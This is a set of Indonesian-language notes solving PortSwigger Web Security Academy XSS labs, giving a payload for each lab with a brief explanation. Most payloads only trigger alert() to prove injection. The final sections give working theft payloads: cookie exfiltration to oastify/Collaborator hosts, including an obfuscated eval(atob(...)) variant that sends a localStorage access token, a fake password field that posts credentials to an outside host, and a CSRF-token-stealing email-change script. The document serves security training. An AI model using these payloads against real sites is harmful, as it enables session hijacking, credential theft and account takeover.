### Reflected XSS into HTML context with nothing encoded    

**Payload** : 
```html
<script>alert(1)</script>
```

### Stored XSS into HTML context with nothing encoded

**Payload** : 
```html
<script>alert(1)</script> 
```

### DOM XSS in document.write sink using source location.search

**Payload** : 
```html
"><script>alert(1)</script>
```
**Penjelasan** : Harus ditutup terlebih dahulu tag img dengan “>

### DOM XSS in innerHTML sink using source location.search
**Payload** : 
```html
<img src=1 onerror=alert(1)>
```
**Penjelasan** : pada innerHTML tag `<script>` tidak bekerja, maka dari itu dpt memanfaatkan event onerror pada tag img

### DOM XSS in jQuery anchor href attribute sink using location.search source

**Payload** : 
`/feedback?returnPath=javascript:alert(document.cookie) `

**Penjelasan** : function attr() pada jQuery dapat mengubah value dari DOM, maka dari itu pada script yang terdapat pada HTML, function attr() digunakan pada query returnPath, maka dari itu dpt diexploitasi

### DOM XSS in jQuery selector sink using a hashchange event

**Payload** : 
```html
<iframe src="https://LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=1 onerror=print()>'"> 
```
**Penjelasan** : sink $() memungkinkan juga untuk menyimpan object ke dalam DOM, dengan memanfaatkan event handler `hashchange`, sehingga penyerang hanya perlu mencoba untuk mentrigger event handler hashchange tersebut, dimana dengan bantuan event `onload="this.src+='<img src=1 onerror=print()>'"` akan mentrigger hashchange
**Reference** :
https://github.com/Crypto-Cat/CTF/blob/main/web/WebSecurityAcademy/xss/dom_xss_jquery_hashchange/writeup.md

### Reflected XSS into attribute with angle brackets HTML-encoded

**Payload** : `';alert(1)//`
**Penjelasan** : Dikarenakan pada tag script akan melakukan encoding pada angle bracket, maka dari itu, kita hanya perlu escape dari string dengan `';` dan code selanjutnya bisa diisi dengan javascript

### Stored XSS into anchor href attribute with double quotes HTML-encoded

**Payload** : `javascript:alert(document.domain)` 
**Penjelasan** : Dengan memasukan payload pada form website, memungkinkan value dari href berubah menjadi pseudo-protocol javascript yang akan execute script javascript 

### Reflected XSS into a JavaScript string with angle brackets HTML encoded

**Payload** : `';alert(1)//` 
**Penjelasan** : (Sama seperit no 7) Dikarenakan pada tag script akan melakukan encoding pada angle bracket, maka dari itu, kita hanya perlu escape dari string dengan `';` dan code selanjutnya bisa diisi dengan javascript

### DOM XSS in document.write sink using source location.search inside a select element

**Payload** : `&storeId=1</select><script>alert(1)</script>` 
**Penjelasan** : Dalam tag script, akan mengecek apakah terdapat query parameter storeId , jika iya maka akan ditambahkan ke tag option dalam tag `<select>`, maka dari itu perlu keluar terlebih dahulu dari tag `<select>` dan selanjutnya bisa menambahkan custom tag script 

### DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

**Payload** : `{{$on.constructor('alert(1)')()}}` 
**Penjelasan** : Dikarenakan pada source code menggunakan attribute ng-app, maka AngularJS akan mengeksekusi javascript yang terdapat pada {{}}, dimana dalam bracket tidak bisa langsung menggunakan javascript code, namun bisa melalui object bawaan dari Angular yaitu $on dan membuat sebuah function baru dengan constructor yaitu alert()

### Reflected DOM XSS

**Payload**: `\"-alert(1)}//`
**Penjelasan** : Pada file searchResult.js terdapat variable searchResultObj dimana akan menyimpan response dari server dalam bentuk JSON, dan variable tersebut akan dipakai pada line
```js
var searchTerm = searchResultsObj.searchTerm
h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
```
Dengan begitu, kita dapat escaping dari `"`, dan karena inputan kita dalam bentuk JSON nantinya, maka dari itu payload `\";alert(1)` tidak akan bekerja karena tidak sesuai dengan sintaks JSON, maka dari itu menggunakan unary operator `-` sebelum alert()

### Stored DOM XSS

**Payload** : `<><img src=1 onerror=alert(1)>`
**Penjelasan** : pada file `loadComment...js` terdapat function `escapeHTML(html)`, pada function tersebut menggunakan func `.replace()`, namun karena `.replace()` hanya akan melakukan replace pada karakter pertama yang ditemui, maka karakter yang selanjutnya tidak akan di replace


### Reflected XSS into HTML context with most tags and attributes blocked

**Payload** : 
```html
<iframe src="https://LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
**Penjelasan** :

### Reflected XSS into HTML context with all tags blocked except custom ones

**Payload** : 
```html
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x'; 
</script>
```
**Penjelasan** : dengan membuat custom tag yang akan otomatis memanggil alert, dan memberi `id=x`, penyerang tinggal memanggil langsung tag tersebut dengan `#x`

### Reflected XSS with some SVG markup allowed

**Payload** : `<svg><animatetransform onbegin=alert(1) attributeName=transform>`
**Penjelasan** : Coba satu satu payload yang ada di cheatsheet

### Reflected XSS in canonical link tag

**Payload** : `https://YOUR-LAB-ID.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)`
**Penjelasan** : [PortSwigger](https://portswigger.net/research/xss-in-hidden-input-fields)
link tag canonical pada `<head>` memungkinkan terjadinya XSS dengan menambahkan kondisi ketika tombol 'X' ditekan, akan mentrigger `alert(1)`

### Reflected XSS into a JavaScript string with single quote and backslash escaped

**Payload** : `</script><script>alert(1)</script>`

### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

**Payload** : `\';alert(1)//`

### Stored XSS into `onclick` event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

**Payload** : `https://google.com&apos;-alert(document.domain)-&apos;`
**Penjelasan** : 

### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

**Payload** : `${alert(document.domain)}`
**Penjelasan** : Karena pada script menggunakan template literal dengan tanda \` itu menandakan kita bisa memasukan javascript code ke dalam ${}

### Exploiting cross-site scripting to steal cookies
**Payload**:
```html
<script>var i=new Image(); i.src="http://z99oqbqbw51wp1w0xw0fu7uau10soic7.oastify.com/?cookie="+btoa(document.cookie);</script>

<script>eval(atob('dmFyIHhocj1uZXcgWE1MSHR0cFJlcXVlc3QoKTsKeGhyLm9wZW4oIkdFVCIsICJodHRwczovL3M2ejZqZGxydThoOHE2ajBlYWczeHhia3RiejJuN2J3Lm9hc3RpZnkuY29tLz8iK2xvY2FsU3RvcmFnZS5nZXRJdGVtKCdhY2Nlc3NfdG9rZW4nKSwgdHJ1ZSk7Cnhoci5zZW5kKCk7='))</script>

<script> 
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', { method: 'POST', mode: 'no-cors', body:document.cookie }); 
</script>
```

### Exploiting cross-site scripting to capture passwords
**Payload** : 
```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{ method:'POST', mode: 'no-cors', body:username.value+':'+this.value });">
```

### Exploiting XSS to bypass CSRF defenses
**Payload** :
```html
<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>
```
### CheatSheet Practice Exam
